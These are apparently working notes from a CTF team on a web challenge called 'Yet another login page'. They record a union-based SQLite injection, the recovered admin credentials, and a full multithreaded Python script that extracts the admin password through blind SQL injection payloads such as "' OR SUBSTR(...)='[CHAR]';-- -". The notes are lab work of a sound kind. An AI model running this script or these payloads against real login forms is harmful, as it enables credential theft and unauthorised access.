## Yet another login page
> **Category:** Web
> **Description:** http://chall.ctf.bamboofox.tw:9527
> **Pad Link:** http://34.87.94.220/pad/web-yet-another-login-page
> **Flag:**
---

## References
**RCE Resources  (TODO):**
* https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database

## Bugs


## Exploit Ideas

Time to GTF
- Login.exe in title of page


### Note: SQLite 3.27.2 

SQLi (Union Based)

Only `users` table in db
~~~
CREATE TABLE "users" (
    "username"  TEXT NOT NULL,
    "password"  TEXT NOT NULL
)
~~~

Credentials: `admin:w1MEoJZVmhu2u7GWN6V4SJRTUrLQxDJK9MBCWezdtOo`

However, "nothing happens" upon login:
```
HTTP/1.1 200 OK
Server: nginx/1.17.10
Date: Sat, 16 Jan 2021 06:28:27 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 43
Connection: close

Hello admin ｡:.ﾟヽ(*´∀`)ﾉﾟ.:｡
```

## Scripts

(Actually not needed) Blind SQL script:
```py
import requests
import sys
from multiprocessing import Pool

MAX_GUESS_LENGTH = 256
POOL_WORKERS = 12

output = []
pool = None

def get_result():
    global output
    result = None

    if len(output) > 0:
        result = "".join(output)
        output = []

    sys.stdout.write("\n")
    return str(result)

def log_result(result):
    global output

    if result:
        pool.terminate()

        if result in range(32, 127):
            char = chr(result)
            output.append(char)
            sys.stdout.write(char)
            sys.stdout.flush()

def multi_request(inj, c):
    url = 'http://chall.ctf.bamboofox.tw:9527/login'

    # Set guess character
    data = {
        "username": inj.replace("[CHAR]", str(chr(c))),
        "password": ""
    }

    # Send payload
    res = requests.post(url, data=data)

    if "Wrong password" in res.text:
        return c
    return False

def inject(inj):
    global pool
    pool = Pool(POOL_WORKERS)

    for c in range(32,127):
        pool.apply_async(multi_request, [inj, c], callback=log_result)
    pool.close()
    pool.join()

def inject_len(query):
    global pool
    pool = Pool(POOL_WORKERS)

    for i in range(1, MAX_GUESS_LENGTH + 1):
        inj = "' OR LENGTH(({}))={};-- -".format(query, i)
        pool.apply_async(multi_request, [inj, i], callback=log_result)
    pool.close()
    pool.join()
    return ord(get_result())

def sqli_query(query, length):
    for i in range(1, int(length) + 1):
        inj = "' OR SUBSTR(({}),{},1)='[CHAR]';-- -".format(query, i)
        orig_output = len(output)
        inject(inj)
        updated_output = len(output)
        if orig_output == updated_output:
            break
    return get_result()

def enum():
    query = "SELECT password FROM users WHERE username = 'admin'"
    password_len = inject_len(query)
    print "[+] Length of password: {}".format(password_len)
    password = sqli_query(query, password_len)
    print "[+] Password: {}".format(password)

def main():
    enum()

if __name__ == "__main__":
    main()
```